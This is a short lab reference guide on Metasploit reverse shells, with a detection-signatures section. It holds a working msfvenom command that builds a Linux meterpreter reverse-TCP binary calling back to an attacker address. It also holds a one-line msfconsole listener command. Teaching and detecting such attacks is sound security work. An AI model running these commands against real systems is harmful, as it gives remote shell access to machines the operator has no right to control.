# Metasploit Reverse Shell - Attacker Reference Guide

This folder documents standard reverse shell configurations and theoretical command patterns using security assessment frameworks (e.g. `msfconsole`) against a designated private lab environment.

## 1. Overview of Reverse Shell Exploits
A reverse shell exploit occurs when a target system connects back to the attacker's listener port. This bypasses typical ingress firewall rules (which block incoming connections but allow outgoing connections). This maps to **MITRE ATT&CK T1059 (Command and Scripting Interpreter)** and **T1071 (Application Layer Protocol)**.

## 2. Command Reference

### A. Payload Generation (using `msfvenom`)
Generates a standalone Linux ELF binary containing a reverse TCP shell payload.
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o /tmp/reverse.elf
```
* **`-p linux/x64/meterpreter/reverse_tcp`**: Specifies the payload module.
* **`LHOST=192.168.56.10`**: The attacker's IP address (listener destination).
* **`LPORT=4444`**: The listener port on the attacker machine.
* **`-f elf`**: Compiles payload into an ELF executable binary.

### B. Listener Configuration (using `msfconsole`)
Launches Metasploit to host the listener interface waiting for the connection back.
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.10; set LPORT 4444; run"
```
* **`exploit/multi/handler`**: The generic payload execution handler.
* **`run`**: Spawns listener thread.

## 3. Network Detection Signatures
* Uncharacteristic outbound TCP connections from a service daemon or unprivileged user (e.g. `www-data` or `nobody`) to external ports (e.g. 4444).
* Invocation of interactive shell binaries (`/bin/sh`, `/bin/bash`) by non-interactive service accounts (viewable via `auditd` execution records).
* IDS alert on Metasploit-specific traffic handshake headers.
